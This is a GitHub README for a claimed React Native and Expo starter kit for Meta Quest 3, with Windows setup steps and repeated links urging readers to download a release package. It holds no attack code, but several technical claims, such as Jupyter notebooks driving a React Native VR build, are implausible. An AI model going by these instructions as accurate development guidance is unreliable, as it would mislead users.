# 🕶️ react-native-meta-quest-starter - Easy VR App Setup for Windows

[![Download Releases](https://img.shields.io/badge/Download-Get%20Setup-brightgreen?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/releases)

## Overview

react-native-meta-quest-starter is an open-source starter kit designed to help you build VR apps for the Meta Quest 3 and Horizon OS. It uses React Native and Expo, along with expo-horizon-core. This tool offers a ready-to-use environment that works with Jupyter notebooks to simplify development. It comes with a full quickstart guide for Windows users, making it easier to begin VR app creation without deep programming skills.

This project serves the Meta Quest community by providing a solid base for mixed reality (XR) and VR experiences. It supports TypeScript and React Native VR, using Expo to manage building and running apps.

## 🧰 What You Need Before Starting

To use react-native-meta-quest-starter on Windows, ensure your computer meets these basics:

- Windows 10 or 11, 64-bit version
- At least 8 GB of RAM
- Free storage space: minimum 2 GB
- USB port to connect your Meta Quest 3
- A stable internet connection to download files and dependencies

You will also need a Meta Quest 3 device or Horizon OS-compatible VR headset to test the apps. This guide focuses on setting up your PC to work with the software first.

## 🖥️ How It Works

This starter kit bundles React Native and Expo tools configured for VR development. It integrates with Jupyter notebooks, letting you write and test parts of your app in an interactive environment.

Instead of writing code from scratch, you can use this template as a base. It handles the connection to Meta Quest 3, VR runtime, and Expo’s build system. You only need to change files or assets to customize your VR world.

## 🔍 Features Included

- Ready-to-use React Native VR template tailored for Meta Quest 3
- Expo integration for easy app management and running
- Jupyter notebook setup for interactive coding and testing
- TypeScript support for safer, organized code
- Setup files and instructions for Windows quickstart
- Open-source, allowing you to modify and extend the project freely
- Support for Horizon OS, expanding your app’s reach

## 📥 Download &#128229;

Start by downloading the files you need. Visit the releases page to get the latest version:

[![Download Release](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://github.com/Emirordu/react-native-meta-quest-starter/releases)

On the releases page, find the latest version and download the Windows package or ZIP file. This package contains everything needed to start the app development, including the Jupyter notebook and Expo setup files.

## ⚙️ Windows Setup and Installation

Follow these steps to set up the app on your Windows system.

1. **Download the latest release:** Use the link above to get the ZIP file or installer.

2. **Extract the files:** Right-click the downloaded ZIP and choose "Extract All" to unpack the folder where you want.

3. **Install Node.js:** The app uses Node.js to run tools and scripts. Download the latest LTS version from [nodejs.org](https://nodejs.org/en/). Choose the Windows installer and follow the instructions.

4. **Install Python:** Jupyter notebooks require Python. Visit [python.org](https://www.python.org/downloads/windows/) and install the latest stable release.

5. **Open Command Prompt:** Press `Win + R`, type `cmd`, and press Enter.

6. **Navigate to the extracted folder:** Use the `cd` command. For example,  
   `cd C:\Users\YourName\Downloads\react-native-meta-quest-starter`

7. **Install dependencies:** Run the following command in the prompt:  
   `npm install`  
   This installs all Node.js packages needed.

8. **Start the Jupyter notebook:** Run:  
   `npm run notebook`  
   This opens the interactive Jupyter environment in your web browser.

9. **Open the starter notebook:** Inside the browser, locate `starter-notebook.ipynb` and open it. The notebook guides you through basic app testing.

10. **Connect your Meta Quest 3 headset:** Use a USB cable to connect the headset to your PC. Make sure it’s in developer mode (this option is found in the headset’s settings).

11. **Run the app on your headset:** Follow the notebook instructions to build and send the VR app to your device via Expo.

## 🔧 Using the Jupyter Notebook for Development

The key part of this starter is the Jupyter notebook interface. It makes VR coding easier by letting you run small parts of code separately.

- Each cell in the notebook contains a bit of code or explanation.
- Run the cells in order by clicking the "Run" button or pressing Shift+Enter.
- The notebook shows output below each cell, so you see results as you test.
- You can modify the example code to add objects, adjust VR scenes, or play with environment settings.

You don’t need prior coding skills to experiment here. The notebook includes comments explaining what each part does.

## 🧑‍💻 Basic Commands You’ll Use

These commands run inside the Command Prompt or terminal window.

- `npm start` - Starts the Expo server to launch your VR app.
- `npm run notebook` - Opens the Jupyter notebook.
- `npm install` - Installs or updates app dependencies.
- `expo build` - Builds a version of your VR app ready for Meta Quest 3.
- `adb devices` - Checks if the headset is detected by your PC (ADB must be installed).

## 📁 Folder Structure Explained

- `/notebooks` - Contains the Jupyter notebook files for interactive coding.
- `/src` - The app’s source code, including VR components and assets.
- `/node_modules` - Folder auto-created during installation; contains app dependencies.
- `/assets` - Images, 3D models, and other resources used by the app.
- `package.json` - Lists dependencies and scripts used by npm.
- `README.md` - This instruction file and general info.

## 👩‍🔧 Troubleshooting Tips

- Check your USB cable and connection if the headset does not appear.
- Make sure Meta Quest 3 is in developer mode.
- Restart your PC if npm or Python commands do not run.
- Verify Node.js and Python install correctly with `node -v` and `python --version`.
- Update npm packages: run `npm update` inside the project folder.
- Close other apps using the headset or USB ports to avoid conflicts.

## 🗂️ Additional Resources

- Official Meta Quest 3 developer website for device info and setup tips.
- React Native documentation for understanding the basics of building apps.
- Expo docs on managing apps and deployments.
- Jupyter official site for working with notebook files.

## 🤝 Support and Contribution

This project is open-source. You can explore its code, suggest fixes, or add enhancements through GitHub. The community welcomes straightforward changes and useful feedback.

---

[Download Latest Version](https://github.com/Emirordu/react-native-meta-quest-starter/releases) to get started. Follow the setup steps carefully to run your first VR app on Windows.